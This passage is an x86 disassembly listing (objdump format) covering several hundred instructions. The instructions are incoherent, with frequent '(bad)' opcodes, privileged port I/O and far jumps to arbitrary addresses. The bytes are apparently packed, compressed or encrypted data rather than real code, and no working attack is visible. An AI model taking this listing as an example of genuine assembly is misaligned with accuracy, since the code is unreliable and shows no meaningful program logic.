  4172be:	mov    cl,0x0
  4172c0:	jo     0x4172d5
  4172c2:	adc    eax,0xa1b226e8
  4172c7:	das    
  4172c8:	mov    eax,ds:0x572c2668
  4172cd:	dec    edi
  4172ce:	xlat   BYTE PTR ds:[ebx]
  4172cf:	and    ebx,ebp
  4172d1:	scas   eax,DWORD PTR es:[edi]
  4172d2:	mov    bh,0x47
  4172d4:	mov    ds:0xe5e173bd,al
  4172d9:	sbb    BYTE PTR [eax-0x28],ch
  4172dc:	inc    ecx
  4172dd:	(bad)
  4172e0:	adc    ch,BYTE PTR [edx+0x52]
  4172e3:	mov    ebx,0x8f9f62d2
  4172e8:	lds    edi,FWORD PTR ds:0x2ea25127
  4172ee:	mov    dl,0xfd
  4172f0:	or     edi,DWORD PTR [edi-0xf]
  4172f3:	mov    eax,ds:0x16a3b092
  4172f8:	pushf  
  4172f9:	(bad)  
  4172fa:	fld    TBYTE PTR [eax+ebx*8-0x66cec17e]
  417301:	fnstcw WORD PTR ds:0x9c749753
  417307:	push   ds
  417308:	inc    edx
  417309:	ret    
  41730a:	add    ebp,DWORD PTR cs:[eax+0x1f]
  41730e:	shl    BYTE PTR [ecx+0x30],1
  417311:	push   es
  417312:	mov    dl,bh
  417314:	sar    DWORD PTR [ebp+0x749589ed],1
  41731a:	retf   
  41731b:	jae    0x4172bf
  41731d:	ins    BYTE PTR es:[edi],dx
  41731e:	rcr    edi,cl
  417320:	add    ecx,DWORD PTR [esi-0x55]
  417323:	call   0x5d12:0xb0bcec6e
  41732a:	test   edi,0xd98df4fb
  417330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417331:	sbb    edx,DWORD PTR [ebx+ecx*2-0x24]
  417335:	es sbb dh,dh
  417338:	xchg   edi,eax
  417339:	jp     0x417308
  41733b:	jns    0x417350
  41733d:	lods   eax,DWORD PTR ds:[esi]
  41733e:	inc    edi
  41733f:	inc    ecx
  417340:	mov    BYTE PTR [edi-0x1b70fac1],0x2b
  417347:	sub    eax,0x45bde8a1
  41734c:	mov    esp,0xfa817dd2
  417351:	or     ebp,DWORD PTR [ecx-0x31198da9]
  417357:	ds ja  0x417331
  41735a:	sbb    cl,BYTE PTR [ecx]
  41735c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41735d:	push   ss
  41735e:	ret    0x5c18
  417361:	dec    esi
  417362:	jl     0x4172eb
  417364:	mov    BYTE PTR [edx+edx*4+0x20d52002],cl
  41736b:	mov    al,ds:0x45a6aa21
  417370:	inc    edi
  417371:	push   eax
  417372:	scas   eax,DWORD PTR es:[edi]
  417373:	xor    eax,0x9fc45e79
  417378:	or     edi,edx
  41737a:	stos   DWORD PTR es:[edi],eax
  41737b:	in     eax,dx
  41737c:	inc    ecx
  41737d:	ins    BYTE PTR es:[edi],dx
  41737e:	jne    0x417340
  417380:	sbb    DWORD PTR [esi+0x5011e4ad],0x36ecea49
  41738a:	lahf   
  41738b:	call   0x39222040
  417390:	jno    0x417350
  417392:	jle    0x41732d
  417394:	shr    BYTE PTR [ecx+0x725901a7],1
  41739a:	dec    ebp
  41739b:	retf   
  41739c:	fild   WORD PTR [edx+0x6de4100a]
  4173a2:	sbb    dh,BYTE PTR [eax+0x1350ad42]
  4173a8:	out    dx,al
  4173a9:	mov    edi,0x8dc54d71
  4173ae:	mov    ch,BYTE PTR [edi+0x4a560262]
  4173b4:	and    ch,BYTE PTR [ecx-0x72]
  4173b7:	jmp    0xc165329e
  4173bc:	sub    bh,BYTE PTR [ebx-0x6783363f]
  4173c2:	add    ecx,DWORD PTR [ebx]
  4173c4:	add    al,0xb7
  4173c6:	in     eax,0x6
  4173c8:	dec    esi
  4173c9:	es aas 
  4173cb:	xchg   edi,eax
  4173cc:	mov    edi,DWORD PTR [esi+0x5e]
  4173cf:	je     0x417445
  4173d1:	ror    BYTE PTR [esi-0x444cc63b],cl
  4173d7:	pop    es
  4173d8:	pop    eax
  4173d9:	cs push ds
  4173db:	sar    BYTE PTR [eax+0x3fde75bf],cl
  4173e1:	push   edi
  4173e2:	out    dx,al
  4173e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173e4:	cwde   
  4173e5:	mov    ch,0x2e
  4173e7:	out    dx,eax
  4173e8:	or     esp,DWORD PTR [esp+edx*1]
  4173eb:	int3   
  4173ec:	and    al,0x96
  4173ee:	mov    edi,0x2596cb0
  4173f3:	xchg   ebx,edi
  4173f5:	dec    esp
  4173f6:	fcmovu st,st(6)
  4173f8:	jmp    0xb1e:0x9cba3473
  4173ff:	imul   esp,DWORD PTR [edi+0x39d816e5],0x11
  417406:	inc    ebp
  417407:	js     0x417406
  417409:	pop    esi
  41740a:	pushf  
  41740b:	jmp    0x4173d3
  41740d:	cmp    DWORD PTR [edx-0x722417fc],esi
  417413:	xor    al,0x40
  417415:	add    ecx,DWORD PTR [eax+ecx*2]
  417418:	aaa    
  417419:	inc    esp
  41741a:	shl    BYTE PTR [edi],1
  41741c:	(bad)  
  41741e:	repz rcl DWORD PTR [ecx],1
  417421:	es inc esi
  417423:	ss call edx
  417426:	xor    dl,BYTE PTR [ebp+0x4a9a6e7]
  41742c:	sbb    esp,edx
  41742e:	aas    
  41742f:	mov    ah,0x3f
  417431:	bound  ecx,QWORD PTR [ebx]
  417433:	mov    eax,0x8b868f6e
  417438:	in     eax,dx
  417439:	das    
  41743a:	mov    ecx,?
  41743c:	mov    al,ds:0xcfb97397
  417441:	(bad)  
  417442:	adc    esp,DWORD PTR [edi+0x61f3e53c]
  417448:	(bad)  
  417449:	jns    0x41741a
  41744b:	imul   edx,DWORD PTR [eax],0x4727eb30
  417451:	retf   0xa84
  417454:	xchg   ebp,eax
  417455:	or     al,0xca
  417457:	xor    BYTE PTR [ecx+0x33c61cf],0xa2
  41745e:	(bad)  [esi-0x7e]
  417461:	fcomp  QWORD PTR [ecx]
  417463:	data16 daa 
  417465:	mov    ebx,0x5ac67c09
  41746a:	push   eax
  41746b:	out    0xe3,eax
  41746d:	arpl   WORD PTR [ebx+0x7f],bx
  417470:	loop   0x417448
  417472:	cli    
  417473:	fiadd  WORD PTR [edx-0x2b1b752b]
  417479:	jl     0x41745c
  41747b:	or     DWORD PTR [ebp+0x1aedb770],0xffffff82
  417482:	mov    esi,0x2a71609e
  417487:	xchg   BYTE PTR [edi],ah
  417489:	cmp    ecx,edx
  41748b:	stc    
  41748c:	jl     0x417419
  41748e:	add    ecx,DWORD PTR [eax+ebp*4-0x1449ab75]
  417495:	cmp    ah,BYTE PTR [esi]
  417497:	outs   dx,DWORD PTR ds:[esi]
  417498:	test   BYTE PTR ds:0xad56f507,cl
  41749e:	sbb    al,0x49
  4174a0:	and    al,0xc4
  4174a2:	repz into 
  4174a4:	jmp    0xf9f7e4ce
  4174a9:	jb     0x4174d6
  4174ab:	ret    0x4ab0
  4174ae:	mov    bl,0xe4
  4174b0:	jo     0x417518
  4174b2:	jmp    0x41748d
  4174b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174b5:	out    0x6a,eax
  4174b7:	mov    WORD PTR [edi+0x7],?
  4174ba:	xchg   edi,eax
  4174bb:	stos   DWORD PTR es:[edi],eax
  4174bc:	out    dx,al
  4174bd:	cmp    al,0x17
  4174bf:	test   al,0xcf
  4174c1:	xchg   esi,eax
  4174c2:	retf   
  4174c3:	dec    eax
  4174c4:	scas   al,BYTE PTR es:[edi]
  4174c5:	ret    0xc629
  4174c8:	cmc    
  4174c9:	lods   al,BYTE PTR ds:[esi]
  4174ca:	mov    al,0xe1
  4174cc:	inc    edi
  4174cd:	ja     0x4174a0
  4174cf:	dec    edi
  4174d0:	in     al,dx
  4174d1:	fs mov ah,0x9b
  4174d4:	and    DWORD PTR [ecx],eax
  4174d6:	mov    bh,0x36
  4174d8:	and    edx,DWORD PTR [esp+edx*8+0xc2f26]
  4174df:	xchg   esi,eax
  4174e0:	jl     0x417523
  4174e2:	and    eax,0xe668dc39
  4174e7:	jl     0x4174ae
  4174e9:	div    BYTE PTR [esi+edi*8+0x6c370c4f]
  4174f0:	test   DWORD PTR [edi+0x3c0161b7],eax
  4174f6:	adc    ebp,DWORD PTR [eax+0x20]
  4174f9:	mov    al,ds:0xbe217c11
  4174fe:	icebp  
  4174ff:	test   BYTE PTR [ecx+edx*2],0xa9
  417503:	out    0xd9,al
  417505:	jl     0x4174c6
  417507:	dec    esi
  417508:	cmp    al,0xdf
  41750a:	xor    ah,dl
  41750c:	push   ebx
  41750d:	fimul  DWORD PTR [ecx+0x5a2e115a]
  417513:	xchg   edi,eax
  417514:	push   edi
  417515:	in     al,0xb6
  417517:	pop    ecx
  417518:	mov    dh,0x34
  41751a:	jns    0x417514
  41751c:	outs   dx,BYTE PTR ds:[esi]
  41751d:	adc    BYTE PTR [ecx+ecx*8+0x7d],cl
  417521:	dec    ebx
  417522:	ret    0x713b
  417525:	mov    ebp,0xc71f8c97
  41752a:	call   0xdbbd4777
  41752f:	cld    
  417530:	fwait
  417531:	push   ds
  417532:	shl    DWORD PTR [esi],0x3b
  417535:	repnz mov ?,WORD PTR [esi]
  417538:	and    DWORD PTR [ebx+0x65782b2b],edi
  41753e:	ror    DWORD PTR [esp+ebx*2-0x401defc8],1
  417545:	ins    BYTE PTR es:[edi],dx
  417546:	pop    ss
  417547:	mov    esp,0x11726fd8
  41754c:	adc    eax,0x6ca2a48b
  417551:	out    dx,eax
  417552:	cs mov bh,0xde
  417555:	lods   eax,DWORD PTR ds:[esi]
  417556:	pop    ebx
  417557:	pop    ebx
  417558:	sbb    al,0xf2
  41755a:	call   0xc8d9:0xbe0ae32e
  417561:	dec    edx
  417562:	sbb    DWORD PTR [ebx+0xe],esi
  417565:	in     al,0x72
  417567:	adc    eax,0x7177f7ea
  41756c:	fcomp  QWORD PTR [esi+0x3bc5cc8]
  417572:	aad    0xb8
  417574:	out    0x76,al
  417576:	(bad)  
  417577:	jle    0x4175ed
  417579:	adc    al,0xaf
  41757b:	in     al,0x56
  41757d:	or     eax,0x1a7335bb
  417582:	clc    
  417583:	jnp    0x41755a
  417585:	dec    esi
  417586:	arpl   WORD PTR [edi+0x6c],sp
  417589:	ss xchg ecx,eax
  41758b:	mov    ds:0x7bdbedca,eax
  417590:	cli    
  417591:	mov    esi,0x77b0a6cd
  417596:	add    dh,BYTE PTR [esp+edx*2+0x26]
  41759a:	cmp    al,BYTE PTR [esi+eax*1]
  41759d:	add    ecx,DWORD PTR [esi+ebp*1]
  4175a0:	pop    ecx
  4175a1:	arpl   WORD PTR [ecx],sp
  4175a3:	test   al,0x8a
  4175a5:	mov    ds:0x43b4ae5f,al
  4175aa:	mov    edi,DWORD PTR [ecx]
  4175ac:	sub    ch,BYTE PTR ds:0x3cb968b5
  4175b2:	mov    al,0x42
  4175b4:	mov    al,ds:0xb3c372ee
  4175b9:	or     BYTE PTR [ecx+ebx*8+0x1190849e],dl
  4175c0:	push   esi
  4175c1:	mov    DWORD PTR [ecx+0x58],ebp
  4175c4:	rep outs dx,DWORD PTR ds:[esi]
  4175c6:	mov    ah,0x72
  4175c8:	lods   al,BYTE PTR ds:[esi]
  4175c9:	ins    BYTE PTR es:[edi],dx
  4175ca:	adc    ecx,DWORD PTR [esi+0x4e]
  4175cd:	lea    eax,[ebx-0x1dd8f4a4]
  4175d3:	inc    DWORD PTR [edi+0x38]
  4175d6:	xchg   cl,ah
  4175d8:	call   0x8f4f:0x99b6a1bb
  4175df:	das    
  4175e0:	pop    eax
  4175e1:	dec    esp
  4175e2:	pop    ds
  4175e3:	xor    bh,BYTE PTR [edx+0x0]
  4175e6:	inc    ebx
  4175e7:	inc    esi
  4175e8:	cmp    al,0x6f
  4175ea:	(bad)  
  4175eb:	push   ecx
  4175ec:	bound  ecx,QWORD PTR [edx]
  4175ee:	xor    esp,DWORD PTR [esi+0x1d]
  4175f1:	outs   dx,DWORD PTR ds:[esi]
  4175f2:	inc    esi
  4175f3:	jo     0x417627
  4175f5:	sbb    BYTE PTR [edx+0x5a025d03],cl
  4175fb:	mov    dl,0xed
  4175fd:	push   DWORD PTR [edi]
  4175ff:	loopne 0x41761f
  417601:	dec    esp
  417602:	fcmovnu st,st(7)
  417604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417605:	mov    bh,0x88
  417607:	add    cl,dl
  417609:	cmp    ebx,esi
  41760b:	inc    edx
  41760c:	push   0x8e2e0667
  417611:	mov    bh,0xb8
  417613:	call   0xad26365a
  417618:	xchg   ebx,eax
  417619:	mov    bh,0x3c
  41761b:	mov    dh,BYTE PTR [ecx+0x27]
  41761e:	pop    eax
  41761f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417620:	xchg   bl,ah
  417622:	call   0xcaa5201b
  417627:	sub    BYTE PTR [ecx+eiz*4],ah
  41762a:	ror    BYTE PTR [edi-0x78],cl
  41762d:	(bad)  
  41762e:	aad    0x1a
  417630:	xchg   ecx,eax
  417631:	enterw 0x9545,0xa
  417636:	pop    esp
  417637:	inc    edi
  417638:	div    DWORD PTR [ecx]
  41763a:	imul   esi,DWORD PTR [edx-0x17],0x2a
  41763e:	xchg   edx,eax
  41763f:	add    eax,0xde62f65b
  417644:	push   ss
  417645:	fist   DWORD PTR [eax-0x5]
  417648:	loope  0x41761c
  41764a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41764b:	push   esi
  41764c:	adc    BYTE PTR [edx+0x458607c1],al
  417652:	dec    esp
  417653:	or     DWORD PTR [ecx+0x2438ee38],edx
  417659:	lea    ebx,ds:0x5f701436
  41765f:	mov    BYTE PTR [esi+0x56f559c],al
  417665:	sbb    BYTE PTR [ecx-0x1f],ah
  417668:	inc    esi
  417669:	jb     0x417674
  41766b:	cmc    
  41766c:	add    eax,0x628699f4
  417671:	stos   BYTE PTR es:[edi],al
  417672:	pop    ebx
  417673:	cmp    ebp,DWORD PTR [edi]
  417675:	icebp  
  417676:	icebp  
  417677:	and    ch,dl
  417679:	int3   
  41767a:	pop    ebp
  41767b:	dec    ebp
  41767c:	mov    al,0x2d
  41767e:	add    ch,BYTE PTR [edi+0x70]
  417681:	sbb    ebx,DWORD PTR [ebp+eiz*1-0x4e]
  417685:	cmp    eax,0x5eb01af1
  41768a:	pop    ebx
  41768b:	pop    ebp
  41768c:	jae    0x417664
  41768e:	inc    esi
  41768f:	mov    eax,0xfb42c04
  417694:	xor    dh,bl
  417696:	imul   ecx,esp,0xffffff86
  417699:	jmp    0xa5fd:0x279a55d2
  4176a0:	jb     0x4176a7
  4176a2:	and    esi,DWORD PTR [ebx-0x56ed49d1]
  4176a8:	xchg   edx,eax
  4176a9:	clc    
  4176aa:	les    ebx,FWORD PTR [esi-0x54b2492a]
  4176b0:	pop    esp
  4176b1:	addr16 sub al,0x6a
  4176b4:	inc    esi
  4176b5:	shl    DWORD PTR gs:0x41685f80,1
  4176bc:	loop   0x4176e1
  4176be:	dec    ebx
  4176bf:	mov    ah,0x4c
  4176c1:	jbe    0x4176c4
  4176c3:	dec    edi
  4176c4:	xchg   esi,eax
  4176c5:	fnstenv [edx-0x27]
  4176c8:	jns    0x4176a3
  4176ca:	sub    edx,esp
  4176cc:	rcl    DWORD PTR [esi],cl
  4176ce:	pop    ebp
  4176cf:	add    eax,0x2d3b498b
  4176d4:	xchg   BYTE PTR ds:0x28c9712d,ah
  4176da:	retf   0xffe
  4176dd:	hlt    
  4176de:	xchg   DWORD PTR [eax+edi*4],edx
  4176e1:	sbb    BYTE PTR [ebx+0xc],ch
  4176e4:	int    0x29
  4176e6:	xchg   ebx,eax
  4176e7:	mov    ecx,0xb856b287
  4176ec:	mov    ecx,0xb6f85026
  4176f1:	xor    esi,esp
  4176f3:	jno    0x417691
  4176f5:	stos   BYTE PTR es:[edi],al
  4176f6:	and    eax,0x600693a8
  4176fb:	jecxz  0x417745
  4176fd:	push   ds
  4176fe:	jle    0x4176a0
  417700:	mov    esp,0xd50df04b
  417705:	xor    edi,DWORD PTR [ebx]
  417707:	mov    bl,dl
  417709:	mov    ebp,0x21fb3f28
  41770e:	xchg   bp,si
  417711:	outs   dx,DWORD PTR ds:[esi]
  417712:	dec    esi
  417713:	mov    ah,0x72
  417715:	fcomp  DWORD PTR [esi+0x6eb28a99]
  41771b:	adc    edi,eax
  41771d:	test   BYTE PTR [edi-0x76e47229],ah
  417723:	mov    al,0x98
  417725:	push   ss
  417726:	retf   
  417727:	mov    dl,0xe3
  417729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41772a:	pand   mm0,mm6
  41772d:	scas   al,BYTE PTR es:[edi]
  41772e:	hlt    
  41772f:	inc    ebp
  417730:	aam    0x36
  417732:	ficomp DWORD PTR [edi-0x27]
  417735:	cmp    bl,BYTE PTR [edi+0x68]
  417738:	dec    edi
  417739:	mov    ah,0x95
  41773b:	(bad)  
  41773c:	daa    
  41773d:	lods   al,BYTE PTR ds:[esi]
  41773e:	pop    ebp
  41773f:	mov    eax,0x80fe7ee2
  417744:	lock or esi,DWORD PTR [esi]
  417747:	pop    ecx
  417748:	pop    ecx
  417749:	into   
  41774a:	psrlw  mm3,QWORD PTR [ecx+0x4993bb8d]
  417751:	mov    bl,0x5
  417753:	xchg   DWORD PTR [edi],ecx
  417755:	scas   eax,DWORD PTR es:[edi]
  417756:	ss inc eax
  417758:	jbe    0x4177d2
  41775a:	push   ds
  41775b:	das    
  41775c:	add    eax,ebp
  41775e:	inc    eax
  41775f:	push   gs
  417761:	jo     0x417765
  417763:	out    dx,al
  417764:	ds dec edx
  417766:	push   ebx
  417767:	jp     0x417754
  417769:	fist   WORD PTR gs:[edx+eax*4-0x24]
  41776e:	js     0x4177be
  417770:	jmp    0x210949f4
  417775:	out    dx,al
  417776:	mov    ebp,0xf1efcf95
  41777b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41777d:	add    ecx,DWORD PTR [eax+ebx*4]
  417780:	ja     0x4177b4
  417782:	add    BYTE PTR [ebx],bl
  417784:	sahf   
  417785:	sahf   
  417786:	pop    es
  417787:	lods   al,BYTE PTR ds:[esi]
  417788:	add    bh,ch
  41778a:	mov    ebx,0x8bbe8dfd
  41778f:	mov    cl,0x42
  417791:	pop    ebp
  417792:	repz mov eax,0xf86982a1
  417798:	clc    
  417799:	or     DWORD PTR [esi-0x65fd6c19],ecx
  41779f:	xor    eax,0x3a878202
  4177a4:	jmp    0x41780f
  4177a6:	lahf   
  4177a7:	(bad)  
  4177a8:	pop    ebx
  4177a9:	pop    ss
  4177aa:	fisttp QWORD PTR [ecx-0x6b4c3b2a]
  4177b0:	adc    eax,0xba49c5f
  4177b5:	adc    DWORD PTR [ebx+0x63],ebp
  4177b8:	and    edx,DWORD PTR [ecx-0x57]
  4177bb:	xor    eax,0xac1f8415
  4177c0:	cmp    ebp,DWORD PTR [ecx]
  4177c2:	sahf   
  4177c3:	ja     0x417769
  4177c5:	adc    al,0x49
  4177c7:	inc    edi
  4177c8:	mov    ds:0x441c954f,al
  4177cd:	das    
  4177ce:	cwde   
  4177cf:	neg    DWORD PTR [ecx]
  4177d1:	leave  
  4177d2:	xor    esp,DWORD PTR [ebx+0x38f9dd6c]
  4177d8:	out    0x5e,eax
  4177da:	aad    0x4f
  4177dc:	es sub esi,ebp
  4177df:	mul    DWORD PTR [ebx]
  4177e1:	in     eax,dx
  4177e2:	fs pop ecx
  4177e4:	sub    al,0x7b
  4177e6:	arpl   WORD PTR [esi],si
  4177e8:	mov    al,ds:0xaeb50aa6
  4177ed:	xchg   esp,eax
  4177ee:	call   0xc6a98e4c
  4177f3:	mov    esp,0xfc224bde
  4177f8:	test   BYTE PTR [esi+0x57aa78f],dl
  4177fe:	or     al,0x7b
  417800:	cmp    al,0xb6
  417802:	adc    edx,eax
  417804:	int    0xad
  417806:	mov    ebp,DWORD PTR ss:[ebp+0x6a18a63f]
  41780d:	or     al,0x2f
  41780f:	pop    edx
  417810:	lods   al,BYTE PTR ds:[esi]
  417811:	popf   
  417812:	fisttp WORD PTR [ebx-0x5c]
  417815:	ffree  st(2)
  417817:	xor    al,0xdb
  417819:	and    DWORD PTR [esi+0x565bc1fb],ebx
  41781f:	fiadd  WORD PTR [eax+0x387a7b01]
  417825:	stos   BYTE PTR es:[edi],al
  417826:	and    esp,DWORD PTR [edi]
  417828:	adc    BYTE PTR [eax],bh
  41782a:	sub    ebp,edi
  41782c:	xchg   edi,eax
  41782d:	jbe    0x4177b0
  41782f:	jno    0x4177b5
  417831:	sub    BYTE PTR [edi-0x2949df57],bh
  417837:	dec    esi
  417838:	hlt    
  417839:	mov    ecx,0x736cd424
  41783e:	sbb    eax,0x281e48b6
  417843:	push   eax
  417844:	pop    esp
  417845:	jo     0x417811
  417847:	mov    eax,0xf3b228e6
  41784c:	mov    ?,WORD PTR [eax+0x6e41960]
  417852:	inc    esp
  417853:	push   cs
  417854:	cmc    
  417855:	scas   eax,DWORD PTR es:[edi]
  417856:	hlt    
  417857:	jmp    0x5206:0xab347c49
  41785e:	rcr    di,1
  417861:	loopne 0x417830
  417863:	or     DWORD PTR [edi+0x7b90c4c9],ebx
  417869:	jmp    0x417823
  41786b:	rep lods al,BYTE PTR ds:[esi]
  41786d:	fld    TBYTE PTR [eax-0x64aab1b5]
  417873:	sbb    cl,BYTE PTR [edx-0x27]
  417876:	mov    bl,0x28
  417878:	data16 mov ah,0x5b
  41787b:	cmp    eax,0xd15ffff0
  417880:	pop    edi
  417881:	add    BYTE PTR [ebp+0x7d],ah
  417884:	adc    BYTE PTR [esi+0x53acaf77],cl
  41788a:	ins    BYTE PTR es:[edi],dx
  41788b:	retf   0xd051
  41788e:	mov    DWORD PTR [edi-0x40],eax
  417891:	mov    cs,WORD PTR [esp+edx*2]
  417894:	in     al,dx
  417895:	out    0xb3,al
  417897:	mov    ?,ebp
  417899:	or     BYTE PTR [ecx],0xf2
  41789c:	mov    eax,0x511d50b2
  4178a1:	outs   dx,BYTE PTR ds:[esi]
  4178a2:	jne    0x4178b4
  4178a4:	inc    edx
  4178a5:	imul   ebp,DWORD PTR [ecx+ebp*8-0x1015bda3],0x7275550e
  4178b0:	adc    bh,BYTE PTR ds:0xe213df14
  4178b6:	cmp    al,0x18
  4178b8:	cmp    DWORD PTR [ebp+esi*1-0x5a],esi
  4178bc:	mov    DWORD PTR [edx],0xa567ffa4
  4178c2:	dec    ecx
  4178c3:	je     0x4178e4
  4178c5:	ds push edi
  4178c7:	jg     0x417932
  4178c9:	jbe    0x4178a8
  4178cb:	fsubp  st(4),st
  4178cd:	out    dx,al
  4178ce:	into   
  4178cf:	inc    ecx
  4178d0:	jg     0x417908
  4178d2:	out    0x7c,al
  4178d4:	in     al,dx
  4178d5:	push   edi
  4178d6:	dec    esp
  4178d7:	popf   
  4178d8:	jp     0x417908
  4178da:	jo     0x4178af
  4178dc:	out    0x94,eax
  4178de:	mov    edi,0xce07d81e
  4178e3:	mov    ecx,0xad16a87e
  4178e8:	mov    DWORD PTR [ebx+edx*1-0x47],edx
  4178ec:	xor    esi,DWORD PTR [esi-0x4d]
  4178ef:	rol    BYTE PTR [edx],0x28
  4178f2:	jno    0x41796f
  4178f4:	sahf   
  4178f5:	mov    esp,0xbc8d019a
  4178fa:	lods   al,BYTE PTR ds:[esi]
  4178fb:	ins    BYTE PTR es:[edi],dx
  4178fc:	fs repnz sbb eax,0x27b10bc0
  417903:	push   ecx
  417904:	xor    dh,ah
  417906:	xor    DWORD PTR [esi],ecx
  417908:	aam    0x7c
  41790a:	mov    DWORD PTR [edx],edi
  41790c:	inc    edx
  41790d:	fdiv   DWORD PTR [ecx]
  41790f:	jnp    0x4178dd
  417911:	push   edi
  417912:	dec    edx
  417913:	and    ah,BYTE PTR [edi+0xe3b08f6]
  417919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41791a:	xchg   ebx,eax
  41791b:	or     BYTE PTR [edx+esi*8+0x4a],bh
  41791f:	in     eax,0xf0
  417921:	adc    ebx,esp
  417923:	out    0xc2,al
  417925:	shr    DWORD PTR [ecx+0x6a94b24c],cl
  41792b:	sbb    dl,bh
  41792d:	or     DWORD PTR ss:[ecx-0x41],esp
  417931:	mov    DWORD PTR [edx],esi
  417933:	imul   edx,DWORD PTR [ebp+0x4315c52f],0x13
  41793a:	outs   dx,BYTE PTR ds:[esi]
  41793b:	push   edx
  41793c:	(bad)  
  41793d:	jbe    0x41798b
  41793f:	push   edx
  417940:	xchg   ch,bh
  417942:	pop    esi
  417943:	xlat   BYTE PTR ds:[ebx]
  417944:	shl    DWORD PTR [edi],cl
  417946:	inc    ebp
  417947:	sbb    cl,dh
  417949:	mov    ecx,0xadc1e9c5
  41794e:	scas   eax,DWORD PTR es:[edi]
  41794f:	cwde   
  417950:	outs   dx,BYTE PTR ds:[esi]
  417951:	fisttp QWORD PTR [ebx-0x33]
  417954:	sub    BYTE PTR [esi+0x4e],ch
  417957:	rcl    BYTE PTR [esi-0x5f],1
  41795a:	ss sbb ebx,DWORD PTR cs:[ecx+0x29]
  41795f:	jnp    0x417926
  417961:	inc    esi
  417962:	(bad)  
  417963:	aaa    
  417964:	popf   
  417965:	push   0xb18a8e30
  41796a:	xlat   BYTE PTR ds:[ebx]
  41796b:	adc    eax,DWORD PTR [eax]
  41796d:	lock mov edi,0xe8a6974a
  417973:	je     0x41799c
  417975:	inc    edx
  417976:	(bad)  
  417978:	push   esi
  417979:	mov    fs,eax
  41797b:	push   edx
  41797c:	xchg   ebp,eax
  41797d:	rcr    BYTE PTR es:[edx-0x604696ad],cl
  417984:	lock or al,0x92
  417987:	dec    edx
  417988:	imul   ebp,DWORD PTR [eax],0x330a1891
  41798e:	(bad)  
  41798f:	int3   
  417990:	loop   0x4179f0
  417992:	lahf   
  417993:	xor    eax,0x881d6de9
  417998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417999:	push   edi
  41799a:	push   ss
  41799b:	dec    edx
  41799c:	inc    eax
  41799d:	sbb    ebp,DWORD PTR [ecx-0x51ab1fe]
  4179a3:	test   al,0xdd
  4179a5:	out    0xdf,al
  4179a7:	(bad)  
  4179a8:	ins    BYTE PTR es:[edi],dx
  4179a9:	ja     0x417a0c
  4179ab:	std    
  4179ac:	sub    eax,0x71f7e536
  4179b1:	jo     0x41796d
  4179b3:	jle    0x417a1b
  4179b5:	pop    es
  4179b6:	mov    edx,DWORD PTR [esi-0x2c65bddd]
  4179bc:	jno    0x4179fc
  4179be:	ja     0x417a04
  4179c0:	mov    dl,bl
  4179c2:	scas   al,BYTE PTR es:[edi]
  4179c3:	jmp    0x96769971
  4179c8:	cs leave 
  4179ca:	jo     0x417a1e
  4179cc:	jb     0x41795f
  4179ce:	add    al,0x2
  4179d0:	retf   
  4179d1:	call   0x821b53cc
  4179d6:	xlat   BYTE PTR ds:[ebx]
  4179d7:	outs   dx,BYTE PTR ds:[esi]
  4179d8:	outs   dx,BYTE PTR ds:[esi]
  4179d9:	xor    DWORD PTR [eax+0xd0a4cb0],0xffffffe1
  4179e0:	inc    edx
  4179e1:	(bad)  
  4179e2:	jbe    0x4179b7
  4179e4:	loopne 0x417a44
  4179e6:	cmp    ecx,DWORD PTR [edx]
  4179e8:	mov    eax,ds:0xc681c39f
  4179ed:	xor    ebp,ebp
  4179ef:	mov    ch,0xdd
  4179f1:	pop    es
  4179f2:	int3   
  4179f3:	imul   ebp,edx,0x1b
  4179f6:	pop    esi
  4179f7:	add    eax,0xed2a5ecb
  4179fc:	mov    DWORD PTR [esi+0x757f0629],ebp
  417a02:	sbb    DWORD PTR [eax-0x4e],0x95ed3c75
  417a09:	rol    DWORD PTR [esi+edi*2+0xd5078ba],1
  417a10:	sbb    al,BYTE PTR [esi]
  417a12:	jmp    0x6078:0xe291ece5
  417a19:	imul   esp,DWORD PTR [ebp+eiz*1+0x17ddf0b9],0xffffff9b
  417a21:	mov    edx,0x5a9e0d85
  417a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a27:	mov    ah,0xa9
  417a29:	outs   dx,DWORD PTR ds:[esi]
  417a2a:	xchg   esp,eax
  417a2b:	stos   BYTE PTR es:[edi],al
  417a2c:	pop    ebp
  417a2d:	mov    ecx,0xd801a83c
  417a32:	test   edi,0x4864a735
  417a38:	es aam 0xed
  417a3b:	sbb    edx,DWORD PTR [ebx]
  417a3d:	or     BYTE PTR [edi],dl
  417a3f:	add    esi,DWORD PTR [esi+0x1a3adb]
  417a45:	cmp    DWORD PTR [esi-0x37],0x9e0bbf53
  417a4c:	mov    al,bl
  417a4e:	leave  
  417a4f:	add    DWORD PTR [eax],esp
  417a51:	rol    BYTE PTR [ebx-0x124b0ab7],1
  417a57:	shr    BYTE PTR [esi],cl
  417a59:	pop    edi
  417a5a:	scas   al,BYTE PTR es:[edi]
  417a5b:	mov    bl,0xf9
  417a5d:	sbb    edi,0xcdedb0d
  417a63:	sbb    al,0x8f
  417a65:	xchg   esi,eax
  417a66:	xchg   ecx,eax
  417a67:	pop    edx
  417a68:	xlat   BYTE PTR ds:[ebx]
  417a69:	adc    BYTE PTR [edx+0x18],ch
  417a6c:	dec    esp
  417a6d:	sbb    cl,BYTE PTR [edi-0x66]
  417a70:	test   eax,0x4fd0ca71
  417a75:	jbe    0x417a6d
  417a77:	in     al,dx
  417a78:	loopne 0x417a5d
  417a7a:	cmp    DWORD PTR [ebx],edx
  417a7c:	je     0x417a9c
  417a7e:	sbb    eax,0x157ad8a6
  417a83:	sti    
  417a84:	xor    ecx,esi
  417a86:	push   ss
  417a87:	jae    0x417ad1
  417a89:	in     al,0x8
  417a8b:	pop    es
  417a8c:	imul   ebp,DWORD PTR [esi],0xffffffa0
  417a8f:	cmp    dl,ch
  417a91:	ret    0x30c
